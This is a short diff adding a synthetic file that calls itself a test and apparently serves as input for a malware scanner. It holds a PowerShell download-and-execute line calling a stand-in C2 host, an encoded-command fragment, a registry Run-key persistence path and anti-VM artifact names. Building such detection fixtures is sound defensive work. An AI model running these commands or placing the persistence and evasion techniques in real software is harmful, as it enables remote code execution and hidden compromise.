@@ -1,0 +1,6 @@
+MZThis is a synthetic test file, not real malware.
+IEX(New-Object Net.WebClient).DownloadString('http://c2.evil-test.example.com/payload')
+-EncodedCommand FromBase64String
+Suspicious IP for testing: 203.0.113.77
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run\FakeTestPersistence
+VBoxService.exe SbieDll.dll sandbox artifact strings for anti-vm testing
